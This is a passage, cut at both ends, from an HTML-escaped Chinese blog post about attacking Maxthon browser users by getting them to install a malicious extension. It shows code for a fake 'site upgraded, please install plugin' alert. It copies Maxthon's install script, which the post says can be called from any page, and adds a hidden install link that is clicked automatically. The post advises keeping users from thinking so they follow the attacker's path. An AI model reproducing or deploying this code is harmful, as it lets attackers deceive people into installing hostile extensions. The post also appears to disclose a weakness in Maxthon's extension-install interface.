class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;,&lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;因为页面加载、网络等问题照成的延迟问题，这里我们设置为1秒后运行检测代码。1秒后，将会运行&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt;(plug_setup)!=&lt;span class=&quot;string&quot;&gt;&quot;function&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    alret(&lt;span class=&quot;string&quot;&gt;&quot;因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这个时候如果全局没有plug_setup函数，将会运行下面的alert函数，告诉用户需要安装插件才可以访问。&lt;/p&gt;
&lt;h6 id=&quot;0x1-1-2-欺骗用户进行半自动安装指定插件&quot;&gt;&lt;a href=&quot;#0x1-1-2-欺骗用户进行半自动安装指定插件&quot; class=&quot;headerlink&quot; title=&quot;0x1.1.2 欺骗用户进行半自动安装指定插件&quot;&gt;&lt;/a&gt;0x1.1.2 欺骗用户进行半自动安装指定插件&lt;/h6&gt;&lt;p&gt;我觉的如果让用户安装插件的话，你跳转到页面，让用户把插件的信息、评论看完再安装，岂不是成功率大大降低了，而且也不符合网站的优化。《点石成金》一书上说过这样一句话“不要让用户思考”，这个虽然是网站设计里面的至理名言，但是也同样可以放在攻击里，当一个用户的思考变得更少时，那么他会有很大程度上会跟着攻击者设计好的路走。&lt;/p&gt;
&lt;p&gt;于是，我分析了遨游浏览器安装插件页面里的JavaScript，发现遨游浏览器进行安装插件时调用API在任何页面都可以运行，会照成攻击者在页面写上一些JavaScript代码后，就会像遨游浏览器那样弹出一个框询问用户是否安装插件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我这里进行一些优化，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var ERRORTEXT = &amp;apos;非傲游浏览器或版本过低。&amp;lt;a href=&amp;quot;http://www.maxthon.cn&amp;quot; target=&amp;quot;_blank&amp;quot;&amp;gt;点此获取最新版本傲游浏览器&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function getInstallMessage(that, messagePack, type) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (external.mxCall) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var packMxAttr = $(that).closest(messagePack);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (type === &amp;apos;skin&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            // 浏览器框架版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            var frameVersion = external.mxCall(&amp;apos;GetSkinFxVersion&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        else if (type === &amp;apos;app&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            // 浏览器框架版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            var frameVersion = external.mxCall(&amp;apos;GetAppFxVersion&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            // 下个版本上了就删掉--&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            if (frameVersion === &amp;apos;1.0.0&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                frameVersion = &amp;apos;1.0.1&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            // --下个版本上了就删掉&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        // 插件包框架版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var packMxVersion = packMxAttr.attr(&amp;apos;file_def&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        // 插件包url&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var packUrl = packMxAttr.attr(&amp;apos;file_url&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        // 插件id&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        var packId = packMxAttr.attr(&amp;apos;file_id&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        installPack(frameVersion, packMxVersion, packUrl, type, packId);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        resultPop.show(&amp;apos;浏览器不符&amp;apos;, ERRORTEXT, &amp;apos;确定&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function installPack(frameVersion, packMxVersion, packUrl, type, packId) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var isInstall = returnIsInstall(frameVersion, packMxVersion);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (isInstall !== -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (type === &amp;apos;skin&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            external.mxCall(&amp;apos;InstallSkin&amp;apos;, packUrl);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        else if (type === &amp;apos;app&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            external.mxCall(&amp;apos;InstallApp&amp;apos;, packUrl);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        getUser(packId);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        resultPop.show(&amp;apos;浏览器不符&amp;apos;, ERRORTEXT, &amp;apos;确定&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function returnIsInstall(frameVersion, packMxVersion) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var fvItem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var pvItem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var frameVersion = getVersionArr(frameVersion);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var packMxVersion = getVersionArr(packMxVersion);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    // 定义增长索引值.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var i = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    while (1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        fvItem = frameVersion[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        pvItem = packMxVersion[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (fvItem == null &amp;amp;&amp;amp; pvItem == null) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (fvItem == null) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return -1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (pvItem == null) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (fvItem != pvItem) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            var value = fvItem &amp;gt; pvItem ? 1 : -1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return value;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        i++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function getVersionArr(version) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var versionArr = version.split(&amp;apos;.&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    for (var i = 0; i &amp;lt; versionArr.length; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        versionArr[i] = parseInt(versionArr[i], 10);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return versionArr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function getUser(id) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $.ajax(&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        type: &amp;apos;GET&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        url: &amp;apos;http://extension.maxthon.cn/common/ajax.php?id=&amp;apos; + id,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        data: &amp;apos;data&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        dataType: &amp;apos;json&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        success: function (data) &amp;#123;&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        error: function () &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$(document).delegate(&amp;apos;#app-install&amp;apos;, &amp;apos;click&amp;apos;, function (event) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    event.preventDefault();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    event.stopPropagation();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    getInstallMessage(this, &amp;apos;a[file_def]&amp;apos;, &amp;apos;app&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;详情可以在&lt;a href=&quot;http://extension.maxthon.cn/js/temp.js&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://extension.maxthon.cn/js/temp.js&lt;/a&gt;里第1256行到1600行查看原始代码。&lt;/p&gt;
&lt;p&gt;此处的代码里的入口处就在&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$(document).delegate(&amp;apos;#app-install&amp;apos;, &amp;apos;click&amp;apos;, function (event) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    event.preventDefault();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    event.stopPropagation();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    getInstallMessage(this, &amp;apos;a[file_def]&amp;apos;, &amp;apos;app&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;当点击id为&lt;code&gt;app-install&lt;/code&gt;的DOM时，会先调用&lt;code&gt;getInstallMessage&lt;/code&gt;函数，&lt;code&gt;getInstallMessage&lt;/code&gt;函数里再调用&lt;code&gt;installPack&lt;/code&gt;函数，&lt;code&gt;installPack&lt;/code&gt;函数调用&lt;code&gt;returnIsInstall&lt;/code&gt;函数和&lt;code&gt;getUser&lt;/code&gt;函数，&lt;code&gt;returnIsInstall&lt;/code&gt;函数调用了&lt;code&gt;getVersionArr&lt;/code&gt;函数。&lt;/p&gt;
&lt;p&gt;最核心的代码在installPack函数里的&lt;code&gt;external.mxCall(&amp;#39;InstallApp&amp;#39;, packUrl);&lt;/code&gt;，但是无法直接调用，不然无法安装。而且这里的packUrl必须是&lt;code&gt;http://extension.maxthon.cn&lt;/code&gt;下的，不然无法安装，需要事先提交你的插件到遨游插件平台，才可以。&lt;/p&gt;
&lt;p&gt;上面说到当点击id为&lt;code&gt;app-install&lt;/code&gt;的DOM时才会触发，我这个人比较懒。就直接copy遨游插件的html代码了，顺便把他隐藏了：&lt;br&gt;&lt;code&gt;&amp;lt;a id=&amp;quot;app-install&amp;quot; style=&amp;quot;display:none;&amp;quot; file_def=&amp;quot;1.0.1&amp;quot; file_url=&amp;quot;http://extensiondl.maxthon.cn/skinpack/20062150/1462330643.mxaddon&amp;quot; file_id=&amp;quot;&amp;lt;?echo $view_id;?&amp;gt;&amp;quot;&amp;gt;安装&amp;lt;/a&amp;gt;&lt;/code&gt;，这里的file_id为&lt;code&gt;&amp;lt;?echo $view_id;?&amp;gt;&lt;/code&gt;估计是遨游的程序员没写好代码，PHP没解析成功，解析成html代码了。但是我懒得改，就这样把。然后我再在他们的后面增加&lt;code&gt;$(&amp;quot;#app-install&amp;quot;).click();&lt;/code&gt;代码，让他自动触发&lt;/p&gt;
&lt;p&gt;完整的网站代码如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span 